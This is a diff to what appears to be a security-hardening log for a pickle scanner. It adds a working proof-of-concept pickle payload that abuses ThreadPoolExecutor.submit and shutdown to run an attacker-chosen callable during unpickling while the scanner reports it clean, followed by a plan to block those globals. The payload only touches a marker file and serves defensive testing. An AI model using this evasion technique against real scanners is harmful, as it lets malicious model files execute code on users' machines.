@@ -1673,3 +1673,109 @@ Blocking plan:
 Performance note: the fix adds two tuples to a sorted static table checked with
 binary search. It does not add object-provenance tracking, side-effect
 introspection, or broader callable-flow analysis.
+
+## Turn 41 - `concurrent.futures.ThreadPoolExecutor` submitted-callback gap
+
+Goal: produce another immediate RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_threadpool_executor_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("concurrent.futures", "ThreadPoolExecutor"),
+        b")R\x94",
+        sg("concurrent.futures", "ThreadPoolExecutor.submit"),
+        b"(",
+        b"h\x00",
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_threadpool_executor_marker"),
+        b"tR",
+        b"tR0",
+        sg("concurrent.futures", "ThreadPoolExecutor.shutdown"),
+        b"h\x00",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `concurrent.futures.ThreadPoolExecutor`,
+  `concurrent.futures.ThreadPoolExecutor.submit`, `pathlib.Path.touch`,
+  `pathlib.PosixPath`, and
+  `concurrent.futures.ThreadPoolExecutor.shutdown`, all with
+  `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_threadpool_executor_marker` before
+  `pickle.loads()` returns and returns `None`
+- RCE mechanism: the pickle constructs a `ThreadPoolExecutor()`, memoizes it,
+  calls `ThreadPoolExecutor.submit(executor, pathlib.Path.touch, marker)` to
+  queue an attacker-selected callable with attacker-controlled arguments,
+  discards the returned `Future`, then calls
+  `ThreadPoolExecutor.shutdown(executor)`. The default `wait=True` waits for
+  the queued worker task, so the callback executes during unpickling and the
+  worker is cleaned up before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `concurrent.futures` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals:
+  `concurrent.futures.ThreadPoolExecutor`,
+  `concurrent.futures.ThreadPoolExecutor.submit`,
+  `concurrent.futures.ThreadPoolExecutor.shutdown`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is an executor callback submission sink. The focused
+next block should add sorted `DANGEROUS_GLOBALS` entries for
+`("concurrent.futures", "ThreadPoolExecutor.submit")`,
+`("concurrent.futures", "ThreadPoolExecutor.map")`, and
+`("concurrent.futures", "ThreadPoolExecutor.shutdown")`, plus a manual-pickle
+oracle regression for the memoized executor proof. The hot path remains static
+policy lookup.
+
+## Turn 42 - Block `ThreadPoolExecutor` submitted callbacks
+
+Blocking plan:
+
+- Add `("concurrent.futures", "ThreadPoolExecutor.submit")`,
+  `("concurrent.futures", "ThreadPoolExecutor.map")`, and
+  `("concurrent.futures", "ThreadPoolExecutor.shutdown")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. `ThreadPoolExecutor` itself stays allowed because
+  it only creates the executor; `submit`/`map` wire attacker-selected callables
+  and `shutdown(wait=True)` can force queued callbacks to complete before
+  deserialization returns.
+- Add portable policy coverage for all three raw global reductions so
+  detection does not depend on thread scheduling.
+- Add a CPython oracle regression that manually builds the memoized executor
+  payload, verifies scanner detection for `ThreadPoolExecutor.submit` and
+  `ThreadPoolExecutor.shutdown`, then proves the submitted callback creates the
+  marker during `pickle.loads()`.
+
+Performance note: the fix adds three tuples to a sorted static table checked
+with binary search. It does not add thread-pool state modeling, future tracking,
+or broader asynchronous callback-flow analysis.
